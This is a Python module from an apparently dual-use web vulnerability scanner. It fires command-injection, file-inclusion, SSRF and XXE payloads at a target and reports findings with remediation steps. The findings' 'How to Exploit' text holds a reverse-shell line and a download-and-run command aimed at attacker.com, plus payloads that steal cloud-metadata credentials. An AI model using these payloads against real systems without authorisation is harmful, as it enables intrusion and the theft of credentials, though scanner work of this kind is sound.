"""
Command Injection, File Inclusion & SSRF Testing Module
Tests for RCE, LFI, RFI, and SSRF vulnerabilities with active payloads
"""

import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
from bs4 import BeautifulSoup
import time
import re

def test_command_injection(scanner):
    """Test for command injection vulnerabilities"""
    try:
        _test_os_command_injection(scanner)
        _test_file_inclusion(scanner)
        _test_ssrf(scanner)
        _test_xxe(scanner)
    except Exception as e:
        print(f"Command injection testing error: {e}")

def _test_os_command_injection(scanner):
    """Test for OS command injection"""
    parsed = urlparse(scanner.target_url)
    params = parse_qs(parsed.query)
    
    if not params:
        return
    
    # Command injection payloads
    payloads = [
        '; ls',
        '| whoami',
        '`whoami`',
        '$(whoami)',
        '; ping -c 3 127.0.0.1',
        '| ping -c 3 127.0.0.1',
        '; sleep 5',
        '| sleep 5',
        '`sleep 5`',
        '$(sleep 5)',
        '; cat /etc/passwd',
        '| cat /etc/passwd',
        '& dir',
        '| dir',
    ]
    
    for param_name, param_values in params.items():
        for payload in payloads:
            test_params = params.copy()
            test_params[param_name] = [payload]
            
            new_query = urlencode(test_params, doseq=True)
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                 parsed.params, new_query, parsed.fragment))
            
            try:
                start_time = time.time()
                response = requests.get(test_url, timeout=12, verify=False)
                response_time = time.time() - start_time
                
                # Check for command output in response
                command_indicators = [
                    r'root:[x*]:0:0:',  # /etc/passwd
                    r'uid=\d+',  # whoami output
                    r'PING\s+127\.0\.0\.1',  # ping output
                    r'bytes from 127\.0\.0\.1',
                    r'Volume in drive',  # Windows dir
                    r'Directory of',
                ]
                
                for indicator in command_indicators:
                    if re.search(indicator, response.text, re.IGNORECASE):
                        scanner.add_finding(
                            severity='CRITICAL',
                            category='Remote Code Execution',
                            title=f'OS Command Injection in parameter: {param_name}',
                            description=f'**CRITICAL: REMOTE CODE EXECUTION**\n\n'
                                      f'Parameter: {param_name}\n'
                                      f'Payload: {payload}\n'
                                      f'Command output detected in response\n\n'
                                      f'**Proof of Concept:**\n'
                                      f'```\n{test_url}\n```\n\n'
                                      f'**How to Exploit:**\n'
                                      f'```bash\n'
                                      f'# List files:\n'
                                      f'{param_name}=%3Bls%20-la\n\n'
                                      f'# Read sensitive files:\n'
                                      f'{param_name}=%3Bcat%20/etc/passwd\n\n'
                                      f'# Reverse shell:\n'
                                      f'{param_name}=%3Bbash%20-i%20%3E%26%20/dev/tcp/attacker.com/4444%200%3E%261\n\n'
                                      f'# Download malware:\n'
                                      f'{param_name}=%3Bwget%20http://attacker.com/malware.sh%20-O%20/tmp/m.sh%3Bbash%20/tmp/m.sh\n'
                                      f'```\n\n'
                                      f'**Impact:**\n'
                                      f'- Complete server compromise\n'
                                      f'- Access to all files and databases\n'
                                      f'- Ability to install backdoors\n'
                                      f'- Pivot to internal network',
                            url=test_url,
                            remediation='**CRITICAL FIX REQUIRED:**\n'
                                      '1. NEVER pass user input directly to shell commands\n'
                                      '2. Use language-specific APIs instead of shell commands\n'
                                      '3. If shell commands needed:\n'
                                      '   - Whitelist allowed values only\n'
                                      '   - Use escapeshellarg() in PHP\n'
                                      '   - Use subprocess with shell=False in Python\n'
                                      '4. Run application with minimum privileges\n'
                                      '5. Implement application whitelisting\n\n'
                                      '**Example Fix (Python):**\n'
                                      '```python\n'
                                      '# VULNERABLE:\n'
                                      'os.system("ping " + user_input)\n\n'
                                      '# SECURE:\n'
                                      'import subprocess\n'
                                      'subprocess.run(["ping", "-c", "1", user_input], shell=False)\n'
                                      '```'
                        )
                        return
                
                # Time-based detection for blind command injection
                if ('sleep' in payload or 'WAITFOR' in payload) and response_time > 4.5:
                    scanner.add_finding(
                        severity='CRITICAL',
                        category='Remote Code Execution',
                        title=f'Blind OS Command Injection in: {param_name}',
                        description=f'**CRITICAL: BLIND COMMAND INJECTION**\n\n'
                                  f'Parameter: {param_name}\n'
                                  f'Payload: {payload}\n'
                                  f'Response delayed by {response_time:.2f}s\n\n'
                                  f'**Exploitation:**\n'
                                  f'Use time-based payloads to execute commands blindly\n'
                                  f'Extract data via DNS exfiltration or delayed responses',
                        url=test_url,
                        remediation='Never execute user input as shell commands'
                    )
                    return
                    
            except Exception as e:
                pass

def _test_file_inclusion(scanner):
    """Test for Local/Remote File Inclusion"""
    parsed = urlparse(scanner.target_url)
    params = parse_qs(parsed.query)
    
    if not params:
        return
    
    # LFI payloads
    lfi_payloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\win.ini',
        '/etc/passwd',
        'C:\\windows\\win.ini',
        '....//....//....//etc/passwd',
        '../../../../../../etc/passwd%00',
        'php://filter/convert.base64-encode/resource=index.php',
        'php://input',
        'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==',
    ]
    
    for param_name, param_values in params.items():
        # Check if param might be a file parameter
        if any(keyword in param_name.lower() for keyword in ['file', 'page', 'include', 'path', 'template', 'doc']):
            
            for payload in lfi_payloads:
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                     parsed.params, new_query, parsed.fragment))
                
                try:
                    response = requests.get(test_url, timeout=10, verify=False)
                    
                    # Check for LFI indicators
                    lfi_indicators = [
                        r'root:[x*]:0:0:',  # /etc/passwd
                        r'\[extensions\]',  # win.ini
                        r'for 16-bit app support',  # win.ini
                        r'<\?php',  # PHP source code
                    ]
                    
                    for indicator in lfi_indicators:
                        if re.search(indicator, response.text, re.IGNORECASE):
                            scanner.add_finding(
                                severity='CRITICAL',
                                category='File Inclusion',
                                title=f'Local File Inclusion (LFI) in parameter: {param_name}',
                                description=f'**CRITICAL: LOCAL FILE INCLUSION**\n\n'
                                          f'Parameter: {param_name}\n'
                                          f'Payload: {payload}\n'
                                          f'Successfully read system file\n\n'
                                          f'**Proof of Concept:**\n'
                                          f'```\n{test_url}\n```\n\n'
                                          f'**How to Exploit:**\n'
                                          f'```\n'
                                          f'# Read /etc/passwd:\n'
                                          f'{param_name}=../../../etc/passwd\n\n'
                                          f'# Read application config:\n'
                                          f'{param_name}=../config/database.php\n\n'
                                          f'# Read source code:\n'
                                          f'{param_name}=php://filter/convert.base64-encode/resource=index.php\n\n'
                                          f'# Include log file for RCE:\n'
                                          f'{param_name}=../../../var/log/apache2/access.log\n'
                                          f'(After poisoning log with PHP code via User-Agent)\n'
                                          f'```\n\n'
                                          f'**Impact:**\n'
                                          f'- Read any file on server\n'
                                          f'- Steal database credentials from config files\n'
                                          f'- Read application source code\n'
                                          f'- Potential RCE via log poisoning',
                                url=test_url,
                                remediation='**CRITICAL FIX:**\n'
                                          '1. Never use user input directly in file operations\n'
                                          '2. Use whitelist of allowed files\n'
                                          '3. Validate filename against whitelist only\n'
                                          '4. Use basename() to strip path components\n'
                                          '5. Store files outside web root\n'
                                          '6. Implement proper access controls\n\n'
                                          '**Example Fix (PHP):**\n'
                                          '```php\n'
                                          '// VULNERABLE:\n'
                                          'include($_GET["page"] . ".php");\n\n'
                                          '// SECURE:\n'
                                          '$allowed = ["home", "about", "contact"];\n'
                                          '$page = $_GET["page"];\n'
                                          'if (in_array($page, $allowed)) {\n'
                                          '    include($page . ".php");\n'
                                          '}\n'
                                          '```'
                            )
                            return
                except:
                    pass

def _test_ssrf(scanner):
    """Test for Server-Side Request Forgery"""
    parsed = urlparse(scanner.target_url)
    params = parse_qs(parsed.query)
    
    if not params:
        return
    
    # SSRF payloads
    ssrf_payloads = [
        'http://127.0.0.1',
        'http://localhost',
        'http://169.254.169.254/latest/meta-data/',  # AWS metadata
        'http://metadata.google.internal/computeMetadata/v1/',  # GCP metadata
        'file:///etc/passwd',
        'http://0.0.0.0',
        'http://[::1]',
    ]
    
    for param_name, param_values in params.items():
        if any(keyword in param_name.lower() for keyword in ['url', 'uri', 'link', 'src', 'source', 'target', 'dest']):
            
            for payload in ssrf_payloads:
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                     parsed.params, new_query, parsed.fragment))
                
                try:
                    response = requests.get(test_url, timeout=10, verify=False)
                    
                    # Check for SSRF indicators
                    ssrf_indicators = [
                        'ami-id',  # AWS metadata
                        'instance-id',
                        'computeMetadata',  # GCP
                        'root:[x*]:0:0:',  # /etc/passwd via file://
                    ]
                    
                    for indicator in ssrf_indicators:
                        if indicator in response.text:
                            scanner.add_finding(
                                severity='CRITICAL',
                                category='SSRF',
                                title=f'Server-Side Request Forgery (SSRF) in: {param_name}',
                                description=f'**CRITICAL: SSRF VULNERABILITY**\n\n'
                                          f'Parameter: {param_name}\n'
                                          f'Payload: {payload}\n\n'
                                          f'**Proof of Concept:**\n'
                                          f'```\n{test_url}\n```\n\n'
                                          f'**How to Exploit:**\n'
                                          f'```\n'
                                          f'# Steal AWS credentials:\n'
                                          f'{param_name}=http://169.254.169.254/latest/meta-data/iam/security-credentials/\n\n'
                                          f'# Port scan internal network:\n'
                                          f'{param_name}=http://192.168.1.1:22\n'
                                          f'{param_name}=http://192.168.1.1:80\n\n'
                                          f'# Access internal services:\n'
                                          f'{param_name}=http://localhost:8080/admin\n'
                                          f'```\n\n'
                                          f'**Impact:**\n'
                                          f'- Access internal services\n'
                                          f'- Steal cloud credentials (AWS, GCP, Azure)\n'
                                          f'- Port scan internal network\n'
                                          f'- Bypass firewall restrictions',
                                url=test_url,
                                remediation='**CRITICAL FIX:**\n'
                                          '1. Validate and whitelist allowed URLs/domains\n'
                                          '2. Block requests to private IP ranges\n'
                                          '3. Disable URL redirects\n'
                                          '4. Use separate network for external requests\n'
                                          '5. Implement request signing\n\n'
                                          '**Block Private IPs:**\n'
                                          '- 127.0.0.0/8 (localhost)\n'
                                          '- 10.0.0.0/8 (private)\n'
                                          '- 172.16.0.0/12 (private)\n'
                                          '- 192.168.0.0/16 (private)\n'
                                          '- 169.254.0.0/16 (metadata)'
                            )
                            return
                except:
                    pass

def _test_xxe(scanner):
    """Test for XML External Entity (XXE) injection"""
    response = scanner.get_cached_response(scanner.target_url)
    if not response:
        return
    
    soup = BeautifulSoup(response.content, 'html.parser')
    forms = soup.find_all('form')
    
    # XXE payload
    xxe_payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>'''
    
    for form in forms:
        action = form.get('action', '')
        method = str(form.get('method', 'POST')).upper()
        form_url = urljoin(scanner.target_url, action) if action else scanner.target_url
        
        try:
            if method == 'POST':
                response = requests.post(
                    form_url,
                    data=xxe_payload,
                    headers={'Content-Type': 'application/xml'},
                    timeout=10,
                    verify=False
                )
                
                if 'root:' in response.text and ':0:0:' in response.text:
                    scanner.add_finding(
                        severity='CRITICAL',
                        category='XXE Injection',
                        title='XML External Entity (XXE) vulnerability detected',
                        description=f'**CRITICAL: XXE VULNERABILITY**\n\n'
                                  f'Application processes XML with external entities\n'
                                  f'Successfully read /etc/passwd\n\n'
                                  f'**Impact:**\n'
                                  f'- Read any file on server\n'
                                  f'- SSRF attacks\n'
                                  f'- Denial of Service',
                        url=form_url,
                        remediation='Disable XML external entity processing in XML parser'
                    )
        except:
            pass
